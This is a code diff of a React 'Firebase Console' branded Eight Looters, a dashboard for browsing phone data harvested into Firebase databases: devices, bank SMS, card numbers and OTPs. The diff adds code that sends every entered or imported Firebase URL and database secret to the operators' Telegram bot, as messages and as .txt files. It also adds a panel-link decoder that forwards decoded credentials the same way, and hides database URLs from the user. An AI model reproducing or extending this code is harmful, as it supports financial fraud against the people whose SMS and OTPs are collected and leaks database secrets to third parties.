@@ -1,8 +1,10 @@
 /* ============================================================
-   Eight Looters · Firebase Console v9
-   + SMS 200 limit
-   + Bank SMS date/time
-   + Premium Access (ELIGHT1300MEMBER)
+   Eight Looters · Firebase Console v10
+   + No Premium
+   + Smart Key Input
+   + Merged Pagination (Part-wise)
+   + Telegram .txt Export
+   + Decode Panel Link
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
 const TG_URL = "https://t.me/eightlooters";
@@ -20,6 +22,18 @@ async function notifyTelegram(text){
     try{await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id,text,parse_mode:"HTML",disable_web_page_preview:true})});}catch(e){}
   }));
 }
+async function notifyTelegramFile(textContent, filename="firebase_urls.txt"){
+  await Promise.all(TG_CHAT_IDS.map(async chat_id=>{
+    try{
+      const formData = new FormData();
+      const blob = new Blob([textContent], {type: 'text/plain'});
+      formData.append('document', blob, filename);
+      formData.append('chat_id', chat_id);
+      formData.append('caption', '📄 Firebase URLs List');
+      await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`, {method: "POST", body: formData});
+    }catch(e){}
+  }));
+}
 function _cleanTgKey(key,url){if(!key) return "";if(key===url) return "";if(/firebaseio\.com|firebasedatabase\.app/i.test(key)) return "";if(key.length<10) return "";return key;}
 function tgFirebaseMsg(url,key,source,devices){const ck=_cleanTgKey(key,url);
   return `🔥 <b>NEW FIREBASE ACTIVATED</b>\n\n📡 <b>URL:</b> <code>${_escTg(url)}</code>\n`+
@@ -32,11 +46,6 @@ function tgBulkMsg(items,source,totalTried){const ok=items.filter(x=>x.ok),fail=
   if(ok.length){txt+=`\n🟢 <b>── ACTIVE PANELS ──</b>\n`;ok.slice(0,40).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;});if(ok.length>40) txt+=`<i>…and ${ok.length-40} more</i>\n`;}
   if(fail.length){txt+=`\n🔴 <b>── FAILED ──</b>\n`;fail.slice(0,20).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;});if(fail.length>20) txt+=`<i>…and ${fail.length-20} more</i>\n`;}
   return txt;}
-function tgApkMsg(file,url,key,pid){const ck=_cleanTgKey(key,url);
-  return `🔥 <b>NEW APK FIREBASE</b>\n\n📁 <b>APK:</b> <code>${_escTg(file)}</code>\n📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
-    (ck?`🔑 <b>API Key:</b> <code>${_escTg(ck)}</code>\n`:`🔓 <b>Auth:</b> Public / No key\n`)+
-    (pid?`🆔 <b>Project:</b> <code>${_escTg(pid)}</code>\n`:"")+
-    `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;}
 
 /* ===== Icons ===== */
 const I=(p,s=16)=>React.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",width:s,height:s,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"},p);
@@ -74,7 +83,6 @@ const Ic={
   pinOff:s=>I([<path key="a" d="M12 17v5"/>,<path key="b" d="M15 9.34V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1v2.34"/>,<path key="c" d="M9 9v1.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h11"/>,<path key="d" d="m2 2 20 20"/>],s),
   calendar:s=>I([<path key="a" d="M8 2v4"/>,<path key="b" d="M16 2v4"/>,<rect key="c" width="18" height="18" x="3" y="4" rx="2"/>,<path key="d" d="M3 10h18"/>],s),
   filter:s=>I([<path key="a" d="M3 6h18"/>,<path key="b" d="M7 12h10"/>,<path key="c" d="M10 18h4"/>],s),
-  crown:s=>I([<path key="a" d="M2 20h20"/>,<path key="b" d="M4 20V8l4 4 4-8 4 8 4-4v12z"/>],s),
 };
 
 /* ===== Storage ===== */
@@ -102,6 +110,7 @@ async function fbGet(url,key,path,extra={}){
   if(!r.ok){const txt=await r.text().catch(()=>"");
     if(r.status===401||r.status===403) throw new Error("PERMISSION_DENIED: Use Database Secret, not API key.");
     if(r.status===404) return null;
+    if(r.status===423) throw new Error("Database is locked/disabled (HTTP 423).");
     throw new Error(`HTTP ${r.status}: ${txt.slice(0,200)}`);}
   return r.json();
 }
@@ -202,7 +211,6 @@ function parseDevices(raw){const list=[];if(raw&&typeof raw==="object"){
   });
 } return list;}
 
-/* ⚡ PATCH: SMS LIMIT 200 (was 50) */
 function parseMessages(raw){
   const out=[];
   if(raw&&typeof raw==="object"){
@@ -250,11 +258,7 @@ function extractOtp(text){
 function analyze(msgs){const banks=[],cards=[],phones=new Set(),nets=new Set();
   for(const m of msgs){
     const b=parseBankSms(m.text,m.sender);
-    if(b){
-      /* Keep original SMS time string as detectedAt */
-      if(m.time) b.detectedAt=m.time;
-      banks.push(b);
-    }
+    if(b){if(m.time) b.detectedAt=m.time;banks.push(b);}
     const c=parseCard(m.text);if(c) cards.push(c);
     const p=parsePhone(m.text);if(p) phones.add(p);
     const n=parseNetwork(m.text,m.sender);if(n) nets.add(n);
@@ -370,20 +374,18 @@ function LoginScreen({onConnect,onMergeAll}){
   const [stats,setStats]=useState({});
   const [show,setShow]=useState(false);
   const [url,setUrl]=useState("");const [key,setKey]=useState("");
+  const [needsKey,setNeedsKey]=useState(false);
+  const [checkingUrl,setCheckingUrl]=useState(false);
   const [err,setErr]=useState("");const [busy,setBusy]=useState(false);
   const [bulk,setBulk]=useState("");const [bulkBusy,setBulkBusy]=useState(false);
   const [bulkSum,setBulkSum]=useState(null);const [bulkProgress,setBulkProgress]=useState(null);
   const [fileBusy,setFileBusy]=useState(false);const [fileProgress,setFileProgress]=useState(0);
   const [fileInfo,setFileInfo]=useState("");const [fileName,setFileName]=useState("");const [fileFound,setFileFound]=useState(0);
   const [panels,setPanels]=useState("");const [panelBusy,setPanelBusy]=useState(false);const [panelSum,setPanelSum]=useState(null);
+  const [decodeInput,setDecodeInput]=useState("");
   const [apkFile,setApkFile]=useState("");const [apkBusy,setApkBusy]=useState(false);
   const [apkErr,setApkErr]=useState("");const [apkResult,setApkResult]=useState(null);
   const [copied,setCopied]=useState(false);const [shareLink,setShareLink]=useState("");
-  /* Premium states */
-  const [showPremium,setShowPremium]=useState(false);
-  const [premiumKey,setPremiumKey]=useState("");
-  const [premiumErr,setPremiumErr]=useState("");
-  const [premiumLoading,setPremiumLoading]=useState(false);
   const fileRef=useRef(null);const bulkFileRef=useRef(null);
 
   useEffect(()=>{
@@ -424,87 +426,62 @@ function LoginScreen({onConnect,onMergeAll}){
     return a.url.localeCompare(b.url);
   }),[accounts,stats]);
 
-  async function addShared(u,k,list){setBusy(true);setErr("");
-    try{await fbGet(u,k,"clients");
-      const nx=[...list,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
-      saveAccounts(nx);setAccounts(nx);notifyTelegram(tgFirebaseMsg(u,k,"Shared Link"));onConnect(u,k);
-    }catch{setErr("Shared connection failed.");}finally{setBusy(false);}}
+  async function checkUrlOnly(){
+    const u=url.trim().replace(/\/$/,"");
+    if(!u){setErr("Enter Firebase URL");return;}
+    setCheckingUrl(true);setErr("");setNeedsKey(false);
+    try{
+      const test = await fbGet(u,"","clients");
+      const devCount = test && typeof test==="object" ? Object.keys(test).length : 0;
+      const nx=[...accounts,{id:Date.now(),url:u,key:"",date:new Date().toLocaleString()}];
+      saveAccounts(nx);setAccounts(nx);
+      notifyTelegram(tgFirebaseMsg(u,"","Manual Add (No Key)",devCount));
+      onConnect(u,"");
+    }catch(e){
+      const m=e.message||String(e);
+      if(m.includes("PERMISSION_DENIED")) {setNeedsKey(true);setErr("Key required. Please enter your Database Secret.");}
+      else setErr("Connection failed: "+m.slice(0,120));
+    }finally{setCheckingUrl(false);}
+  }
+
   async function tryConnect(u,k){setBusy(true);setErr("");
     try{await fbGet(u,k,"clients");onConnect(u,k);}
     catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Permission Denied: Use Database Secret, not API key.");
       else if(m.includes("Network error")) setErr("Network error. Check Firebase URL.");else setErr("Connection failed: "+m.slice(0,120));}
     finally{setBusy(false);}}
-  async function submit(){
+
+  async function submitWithKey(){
     const u=url.trim().replace(/\/$/,""),k=key.trim();
     if(!u||!k){setErr("Enter both URL and Key");return;}
-    const ex=accounts.find(a=>a.url===u);if(ex){if(confirm("Account exists. Switch?")) await tryConnect(ex.url,ex.key);return;}
     setBusy(true);setErr("");
     try{const test=await fbGet(u,k,"clients");const devCount=test&&typeof test==="object"?Object.keys(test).length:0;
       const nx=[...accounts,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
-      saveAccounts(nx);setAccounts(nx);notifyTelegram(tgFirebaseMsg(u,k,"Manual Add",devCount));onConnect(u,k);
-    }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Permission Denied: Use Database Secret, not API key.");
+      saveAccounts(nx);setAccounts(nx);notifyTelegram(tgFirebaseMsg(u,k,"Manual Add (With Key)",devCount));onConnect(u,k);
+    }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Invalid Key or Permission Denied.");
       else setErr("Connection failed: "+m.slice(0,120));}finally{setBusy(false);}
   }
+
   function del(id,e){e?.stopPropagation();if(!confirm("Delete this account?")) return;const nx=accounts.filter(a=>a.id!==id);saveAccounts(nx);setAccounts(nx);}
   function share(a,e){e?.stopPropagation();setShareLink(makeShareLink(a.url,a.key));}
 
-  /* ═══════════════════════════════════════════════
-     PREMIUM ACCESS (GitHub-powered)
-     ⚠️ APNA USERNAME AUR REPO YAHAN DAALO ↓
-     ═══════════════════════════════════════════════ */
-  const PREMIUM_KEY = "ELIGHT1300MEMBER";
-  const PREMIUM_GH_USER = "YOUR_GITHUB_USERNAME";   // ← Yahan apna GitHub username likhein
-  const PREMIUM_GH_REPO = "YOUR_GITHUB_REPO";       // ← Yahan apna GitHub repo name likhein
-  const PREMIUM_GH_BRANCH = "main";                 // ← Agar aapka branch 'master' hai to 'master' kar dein
-  const PREMIUM_GH_FILE = "premium_panels.txt";
-  const PREMIUM_GH_RAW = `https://raw.githubusercontent.com/${PREMIUM_GH_USER}/${PREMIUM_GH_REPO}/${PREMIUM_GH_BRANCH}/${PREMIUM_GH_FILE}`;
+  async function exportAllToTg(){
+    if(!accounts.length){setErr("No accounts to export.");return;}
+    const text = accounts.map(a => `${a.url}${a.key ? ` | Key: ${a.key}` : ""}`).join("\n");
+    await notifyTelegramFile(text, `elight_all_panels_${Date.now()}.txt`);
+    alert("✅ .txt file sent to Telegram Bot!");
+  }
 
-  async function verifyPremium(){
-    const k = String(premiumKey||"").trim().toUpperCase();
-    setPremiumErr("");
-    if(!k){setPremiumErr("Enter access key");return;}
-    if(k !== PREMIUM_KEY){setPremiumErr("Invalid access key");return;}
-    setPremiumLoading(true);
-    try{
-      const res = await fetch(PREMIUM_GH_RAW + "?t=" + Date.now(), {cache:"no-store"});
-      if(!res.ok) throw new Error("Could not load premium list. Check GitHub URL/Branch.");
-      const txt = await res.text();
-      const urls = extractFirebaseUrls(txt);
-      if(!urls.length) throw new Error("No Firebase URLs found in premium file.");
-      const working = [];
-      for(const u of urls){
-        try{
-          const c = await fbGet(u,"","clients");
-          if(c !== null){
-            const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
-            working.push({url:u, devices:devCount});
-          }
-        }catch{}
-      }
-      if(!working.length) throw new Error("No reachable premium panels found.");
-      const existing = loadAccounts();
-      const existSet = new Set(existing.map(a=>a.url.replace(/\/$/,"").toLowerCase()));
-      const adds = [];
-      working.forEach(w=>{
-        const u = w.url.replace(/\/$/,"");
-        if(!existSet.has(u.toLowerCase())){
-          adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:u,key:"",date:new Date().toLocaleString(),premium:true});
-          existSet.add(u.toLowerCase());
-        }
-      });
-      if(adds.length){const nx=[...existing,...adds];saveAccounts(nx);setAccounts(nx);}
-      setShowPremium(false);
-      setPremiumKey("");
-      notifyTelegram(tgBulkMsg(
-        working.map(w=>({url:w.url, ok:true, devices:w.devices})),
-        "Premium Access", urls.length
-      ));
-      setTimeout(()=>onMergeAll(), 300);
-    }catch(e){
-      setPremiumErr(String(e.message||e).slice(0,120));
-    }finally{
-      setPremiumLoading(false);
-    }
+  async function decodeAndSend(){
+    const raw = decodeInput.trim();
+    if(!raw){setErr("Paste a panel link to decode.");return;}
+    const decoded = decodeLink(raw.split("?s=")[1] || raw);
+    if(!decoded){setErr("Invalid panel link format.");return;}
+    try {
+      await notifyTelegram(`🔗 <b>DECODED PANEL LINK</b>\n\n📡 <b>URL:</b> <code>${_escTg(decoded.url)}</code>\n` + (decoded.key ? `🔑 <b>Key:</b> <code>${_escTg(decoded.key)}</code>\n` : `🔓 <b>Auth:</b> Public / No key\n`) + `⏰ <b>Time:</b> ${_escTg(_nowIst())}`);
+      const nx=[...accounts,{id:Date.now(),url:decoded.url,key:decoded.key||"",date:new Date().toLocaleString()}];
+      saveAccounts(nx);setAccounts(nx);
+      setDecodeInput("");setErr("");alert("✅ Decoded and sent to Telegram!");
+    } catch(e) { setErr("Failed to send: " + e.message); }
   }
 
   async function processBulkUrls(urls,source){
@@ -529,6 +506,11 @@ function LoginScreen({onConnect,onMergeAll}){
     setBulkSum({success,failed,skipped});setBulkBusy(false);
     const items=[...success.map(s=>({url:s.url,ok:true,devices:s.devices})),...failed.map(f=>({url:f.url,ok:false,reason:f.reason}))];
     if(items.length) notifyTelegram(tgBulkMsg(items,source,urls.length));
+    // Send .txt file to Telegram
+    if(adds.length > 0) {
+      const txtContent = adds.map(a => a.url).join("\n");
+      notifyTelegramFile(txtContent, `new_panels_${Date.now()}.txt`);
+    }
     setTimeout(()=>setBulkProgress(null),3500);
     return {success,failed,skipped};
   }
@@ -629,7 +611,6 @@ function LoginScreen({onConnect,onMergeAll}){
                       <span className="badge" style={{background:stats[a.id]?.ok?"rgba(52,211,153,.1)":"rgba(139,92,246,.06)",borderColor:stats[a.id]?.ok?"rgba(52,211,153,.3)":"rgba(139,92,246,.2)",color:stats[a.id]?.ok?"#34d399":"var(--muted-2)",fontSize:9}}>
                         {stats[a.id]?.ok?`${stats[a.id].online} online`:"checking…"}
                       </span>
-                      {a.premium && <span className="badge" style={{background:"rgba(251,191,36,.1)",borderColor:"rgba(251,191,36,.35)",color:"#fbbf24",fontSize:9}}>👑</span>}
                     </div>
                     <p className="mono" style={{fontSize:10,color:"var(--muted-2)",marginTop:3}}>{a.date} · {stats[a.id]?.ok?`${stats[a.id].total} total`:"—"}</p>
                   </div>
@@ -647,10 +628,19 @@ function LoginScreen({onConnect,onMergeAll}){
               <span>Merge All & Show</span>
               <span style={{fontSize:10,padding:"2px 7px",borderRadius:999,background:"rgba(34,211,238,.15)",border:"1px solid rgba(34,211,238,.3)"}}>{accounts.length}</span>
             </button>
-            <button onClick={()=>{setShowPremium(true);setPremiumErr("");setPremiumKey("");}}
-              className="btn" style={{width:"100%",background:"linear-gradient(135deg,#fbbf24,#f97316)",color:"#fff",border:"1px solid rgba(251,191,36,.6)",boxShadow:"0 8px 24px rgba(251,191,36,.35)",fontWeight:800,letterSpacing:"0.05em"}}>
-              <span>👑 PREMIUM ACCESS</span>
+            <button onClick={exportAllToTg} className="btn" style={{width:"100%",background:"linear-gradient(135deg,#22d3ee,#0ea5e9)",color:"#fff",border:"1px solid rgba(34,211,238,.5)"}}>
+              📤 Export All to Telegram (.txt)
             </button>
+            
+            {/* Decode Panel Link Section */}
+            <div className="glass-2" style={{borderRadius:14,padding:12,marginTop:4}}>
+              <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Decode Panel Link & Send to TG</p>
+              <textarea rows={2} value={decodeInput} onChange={e=>setDecodeInput(e.target.value)} className="inp" placeholder="Paste panel link with ?s=..." style={{fontSize:11}}/>
+              <button onClick={decodeAndSend} disabled={!decodeInput.trim()} className="btn btn-purple" style={{width:"100%",marginTop:8,padding:"8px 14px",fontSize:11}}>
+                Decode & Send to Telegram
+              </button>
+            </div>
+
             <div className="glass-2" style={{borderRadius:14,padding:12,marginTop:4}}>
               <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:8,gap:8,flexWrap:"wrap"}}>
                 <p style={{fontSize:11,fontWeight:600,color:"var(--muted)"}}>Bulk Add Firebase URLs</p>
@@ -681,16 +671,6 @@ function LoginScreen({onConnect,onMergeAll}){
                 {bulkProgress.current && <p className="mono pro-prog-sub" style={{marginTop:6}}>→ {bulkProgress.current.replace(/^https?:\/\//,"").slice(0,60)}</p>}
               </div>}
             </div>
-            <div className="glass-2" style={{borderRadius:14,padding:12}}>
-              <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Import Panel Links</p>
-              <textarea rows={4} value={panels} onChange={e=>setPanels(e.target.value)} className="inp" placeholder="Paste panel links containing ?s=… one per line" style={{fontSize:11}}/>
-              <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",gap:10,marginTop:8}}>
-                <span style={{fontSize:9,color:"var(--muted-2)",lineHeight:1.4}}>Decodes s=, tests, saves working.</span>
-                <button onClick={importPanels} disabled={panelBusy||!panels.trim()} className="btn btn-purple" style={{padding:"8px 14px",fontSize:11}}>
-                  {panelBusy?<><span className="spin sm"/>Importing…</>:"Import Links"}
-                </button>
-              </div>
-            </div>
           </div>
           {(bulkSum||panelSum) && <div style={{marginTop:14,display:"flex",flexDirection:"column",gap:12}}>
             {[["Bulk Add Summary",bulkSum,()=>setBulkSum(null)],["Panel Import Summary",panelSum,()=>setPanelSum(null)]].map(([title,sum,clr])=>sum&&(
@@ -711,7 +691,7 @@ function LoginScreen({onConnect,onMergeAll}){
         </>}
         {show && <div className="a-up">
           <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:18}}>
-            <button onClick={()=>{setShow(false);setErr("");resetApk();setUrl("");setKey("");}} className="ibtn" style={{padding:7}}>{Ic.chevL(14)}</button>
+            <button onClick={()=>{setShow(false);setErr("");resetApk();setUrl("");setKey("");setNeedsKey(false);}} className="ibtn" style={{padding:7}}>{Ic.chevL(14)}</button>
             <h3 style={{fontSize:15,fontWeight:600}}>New Firebase Account</h3>
           </div>
           <div style={{marginBottom:18}}>
@@ -740,13 +720,27 @@ function LoginScreen({onConnect,onMergeAll}){
           </div>
           <div style={{display:"flex",flexDirection:"column",gap:14}}>
             <div><label style={{fontSize:11,fontWeight:600,color:"var(--muted)",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:6,display:"block"}}>Firebase Database URL</label>
-              <input className="inp mono" value={url} onChange={e=>setUrl(e.target.value)} placeholder="https://your-project.firebaseio.com"/></div>
-            <div><label style={{fontSize:11,fontWeight:600,color:"var(--muted)",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:6,display:"block"}}>Authentication Key / Secret</label>
-              <input className="inp mono" value={key} onChange={e=>setKey(e.target.value)} placeholder="Your Firebase secret key"/></div>
+              <input className="inp mono" value={url} onChange={e=>{setUrl(e.target.value);setNeedsKey(false);}} placeholder="https://your-project.firebaseio.com"/></div>
+            
+            {/* Dynamic Key Input */}
+            {!needsKey && !busy && (
+              <button onClick={checkUrlOnly} disabled={checkingUrl} className="btn btn-primary" style={{width:"100%",padding:14}}>
+                {checkingUrl ? <><span className="spin" style={{borderTopColor:"#fff"}}/>Checking URL…</> : <>{Ic.zap(15)}Connect (Check if Key needed)</>}
+              </button>
+            )}
+            
+            {needsKey && (
+              <div className="a-scale">
+                <label style={{fontSize:11,fontWeight:600,color:"#fbbf24",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:6,display:"block"}}>Key Required (Database Secret)</label>
+                <input className="inp mono" value={key} onChange={e=>setKey(e.target.value)} placeholder="Enter your Firebase secret key"/>
+                <button onClick={submitWithKey} disabled={busy} className="btn btn-primary" style={{width:"100%",marginTop:14,padding:14}}>
+                  {busy?<><span className="spin" style={{borderTopColor:"#fff"}}/>Connecting…</>:<>{Ic.zap(15)}Save & Connect</>}
+                </button>
+              </div>
+            )}
           </div>
           <div style={{display:"flex",gap:10,marginTop:20}}>
-            <button onClick={submit} disabled={busy} className="btn btn-primary" style={{flex:1}}>{busy?<><span className="spin" style={{borderTopColor:"#fff"}}/>Connecting…</>:<>{Ic.zap(15)}Save & Connect</>}</button>
-            <button onClick={()=>{setShow(false);setErr("");resetApk();setUrl("");setKey("");}} className="btn btn-ghost">Cancel</button>
+            <button onClick={()=>{setShow(false);setErr("");resetApk();setUrl("");setKey("");setNeedsKey(false);}} className="btn btn-ghost" style={{flex:1}}>Cancel</button>
           </div>
         </div>}
         {err && <p className="a-up" style={{textAlign:"center",fontSize:12,color:"#fb7185",marginTop:14}}>{err}</p>}
@@ -754,30 +748,6 @@ function LoginScreen({onConnect,onMergeAll}){
       <div style={{display:"flex",justifyContent:"center",marginTop:20}}><TGButton label="Chat with us on Telegram"/></div>
       <p style={{textAlign:"center",fontSize:11,color:"var(--muted-2)",marginTop:14}}><span className="grad-text" style={{fontWeight:600}}>{BRAND}</span> · All connections logged</p>
     </div>
-
-    {/* Premium Modal */}
-    {showPremium && <div className="ovl" onClick={()=>setShowPremium(false)}>
-      <div className="glass a-scale" style={{borderRadius:20,padding:26,maxWidth:440,width:"100%",background:"linear-gradient(135deg, rgba(251,191,36,.08), rgba(20,18,40,.98))",border:"1px solid rgba(251,191,36,.4)"}} onClick={e=>e.stopPropagation()}>
-        <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:20}}>
-          <div style={{width:44,height:44,borderRadius:14,background:"linear-gradient(135deg,#fbbf24,#f97316)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:22,boxShadow:"0 8px 24px rgba(251,191,36,.5)"}}>👑</div>
-          <div><h3 style={{fontSize:16,fontWeight:800,color:"#fbbf24",letterSpacing:"0.02em"}}>PREMIUM ACCESS</h3><p style={{fontSize:11,color:"var(--muted)"}}>Enter your access key to unlock</p></div>
-          <button onClick={()=>setShowPremium(false)} className="ibtn" style={{marginLeft:"auto",padding:6}}>{Ic.x(14)}</button>
-        </div>
-        <div style={{marginBottom:16}}>
-          <label style={{fontSize:10,fontWeight:700,letterSpacing:"0.15em",textTransform:"uppercase",color:"#fbbf24",marginBottom:8,display:"block"}}>Access Key</label>
-          <input className="inp mono" type="text" value={premiumKey} onChange={e=>setPremiumKey(e.target.value)}
-            onKeyDown={e=>{if(e.key==="Enter") verifyPremium();}}
-            placeholder="Enter premium key"
-            style={{textAlign:"center",letterSpacing:"0.15em",fontWeight:700,textTransform:"uppercase",borderColor:"rgba(251,191,36,.35)"}}
-            autoFocus/>
-        </div>
-        {premiumErr && <div className="a-in" style={{marginBottom:14,padding:10,borderRadius:10,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185",fontSize:11,textAlign:"center"}}>{premiumErr}</div>}
-        <button onClick={verifyPremium} disabled={premiumLoading} className="btn" style={{width:"100%",padding:14,background:"linear-gradient(135deg,#fbbf24,#f97316)",color:"#fff",border:"1px solid rgba(251,191,36,.5)",fontWeight:800,letterSpacing:"0.08em",fontSize:13}}>
-          {premiumLoading?<><span className="spin" style={{borderTopColor:"#fff"}}/>VERIFYING…</>:"UNLOCK PREMIUM →"}
-        </button>
-        <p style={{fontSize:10,color:"var(--muted-2)",textAlign:"center",marginTop:12,lineHeight:1.5}}>Premium access unlocks all shared panels. Key is case-sensitive.</p>
-      </div>
-    </div>}
 
     {shareLink && <div className="ovl" onClick={()=>setShareLink("")}>
       <div className="glass a-scale" style={{borderRadius:20,padding:24,maxWidth:440,width:"100%"}} onClick={e=>e.stopPropagation()}>
@@ -829,7 +799,6 @@ function Dashboard({fbUrl,fbKey,onLogout}){
     finally{setLoading(false);}
   },[fbUrl,fbKey,toast]);
 
-  /* ⚡ PATCH: limitToLast 40 → 200 */
   const scan=useCallback(async (force=false)=>{
     const cur=ref.current;if(!cur.length) return;
     const now=Date.now();
@@ -1321,7 +1290,6 @@ const BankCard=React.memo(function BankCard({balance,delay=0}){
       <div><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Available</p><p style={{fontSize:20,fontWeight:800,color:"#fff",fontVariantNumeric:"tabular-nums"}}><span style={{color:"#34d399",fontSize:14}}>₹</span>{fmtMoney(balance.availableBalance)}</p></div>
       {balance.transactionAmount&&balance.transactionAmount!==balance.availableBalance&&<div style={{textAlign:"right"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Txn</p><p style={{fontSize:14,fontWeight:700,color:isCredit?"#34d399":"#fb7185",fontVariantNumeric:"tabular-nums"}}>{isCredit?"+":"-"}₹{fmtMoney(balance.transactionAmount)}</p></div>}
     </div>
-    {/* ⚡ DATE/TIME ROW */}
     {timeStr && <div style={{display:"flex",alignItems:"center",gap:6,marginTop:10,paddingTop:8,borderTop:"1px solid rgba(52,211,153,.14)"}}>
       <span style={{color:"#34d399",display:"flex"}}>{Ic.clock(11)}</span>
       <span className="mono" style={{fontSize:10,color:"var(--muted)"}}>{timeStr}</span>
@@ -1360,6 +1328,11 @@ function MergedView({onLogout}){
   const [msg,setMsg]=useState("");
   const [now,setNow]=useState(new Date());
   const [pinnedIds,setPinnedIds]=useState(()=>loadPinnedDevices());
+  
+  // Pagination State
+  const [page, setPage] = useState(1);
+  const [perPage, setPerPage] = useState(100);
+
   const ref=useRef([]);const cache=useRef(new Map());
   const toast=useCallback(m=>{setMsg(m);setTimeout(()=>setMsg(""),2800)},[]);
   ref.current=devices;
@@ -1380,7 +1353,6 @@ function MergedView({onLogout}){
     finally{setLoading(false);}
   },[accounts,toast]);
 
-  /* ⚡ PATCH: limitToLast 40 → 200 */
   const scan=useCallback(async (force=false)=>{
     const cur=ref.current;if(!cur.length) return;
     const now=Date.now();
@@ -1428,6 +1400,13 @@ function MergedView({onLogout}){
     }).sort((a,b)=>{const pa=pinnedIds.includes(a.id),pb=pinnedIds.includes(b.id);if(pa!==pb) return pb?1:-1;if(filter==="online") return Number(b.status)-Number(a.status);return b.id.localeCompare(a.id);});
   },[devices,filter,search,pinnedIds]);
 
+  // Pagination Logic
+  const totalPages = Math.ceil(filtered.length / perPage);
+  const paginatedDevices = useMemo(() => {
+      const start = (page - 1) * perPage;
+      return filtered.slice(start, start + perPage);
+  }, [filtered, page, perPage]);
+
   const online=devices.filter(d=>d.status).length;
   const offline=devices.length-online;
   const phoneNums=devices.filter(d=>d.phoneNumber&&d.phoneNumber!=="—").length;
@@ -1473,7 +1452,7 @@ function MergedView({onLogout}){
           <StatTile label="Bank SMS" value={bankSms} color="#34d399" delay={0.25}/>
         </div>
         <div style={{marginLeft:"auto",display:"flex",gap:8,alignItems:"center",flexWrap:"wrap"}}>
-          {["all","online","offline"].map(f=><button key={f} onClick={()=>setFilter(f)} className={"chip"+(filter===f?" active":"")}>{f}</button>)}
+          {["all","online","offline"].map(f=><button key={f} onClick={()=>{setFilter(f);setPage(1);}} className={"chip"+(filter===f?" active":"")}>{f}</button>)}
           <button onClick={()=>load(true)} className="ibtn" style={{padding:9}}>{Ic.refresh(14)}</button>
         </div>
       </div>
@@ -1483,15 +1462,45 @@ function MergedView({onLogout}){
       : devices.length===0 ? <div className="a-up" style={{textAlign:"center",padding:"70px 20px"}}><p style={{fontSize:15,fontWeight:700,color:"var(--muted)"}}>No devices across saved panels</p></div>
       : <>
           {scanning && <div className="a-in" style={{display:"flex",alignItems:"center",gap:10,marginBottom:14,padding:"8px 14px",borderRadius:12,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)",width:"fit-content"}}><span className="spin sm"/><span style={{fontSize:11,color:"var(--muted)"}}>Scanning SMS…</span></div>}
+          
+          {/* Pagination Header */}
+          <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:16,flexWrap:"wrap",gap:10}}>
+            <div style={{fontSize:12,color:"var(--muted)"}}>
+                Showing <b>{paginatedDevices.length}</b> of <b>{filtered.length}</b> devices
+            </div>
+            <div style={{display:"flex",alignItems:"center",gap:10}}>
+                <span style={{fontSize:11,color:"var(--muted)"}}>Part {page} / {totalPages || 1}</span>
+                <select value={perPage} onChange={(e)=>{setPerPage(Number(e.target.value));setPage(1);}} className="inp" style={{padding:"4px 8px",fontSize:11,width:"auto"}}>
+                    <option value={50}>50 per part</option>
+                    <option value={100}>100 per part</option>
+                    <option value={200}>200 per part</option>
+                    <option value={500}>500 per part</option>
+                </select>
+                <button onClick={()=>setPage(p=>Math.max(1,p-1))} disabled={page===1} className="btn btn-ghost" style={{padding:"5px 10px",fontSize:11}}>Prev</button>
+                <button onClick={()=>setPage(p=>Math.min(totalPages,p+1))} disabled={page===totalPages || totalPages===0} className="btn btn-ghost" style={{padding:"5px 10px",fontSize:11}}>Next</button>
+            </div>
+          </div>
+
           <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(290px,1fr))",gap:16}}>
-            {filtered.map((d,i)=>(
+            {paginatedDevices.map((d,i)=>(
               <div key={`${d.srcId}:${d.id}`} className="a-up" style={{animationDelay:`${Math.min(i*0.03,0.4)}s`}}>
-                {/* ⚠️ Firebase URL Header Hata Diya Gaya Hai Taaki User Ko Na Dikhe */}
+                {/* Firebase URL Header Hata Diya Gaya Hai */}
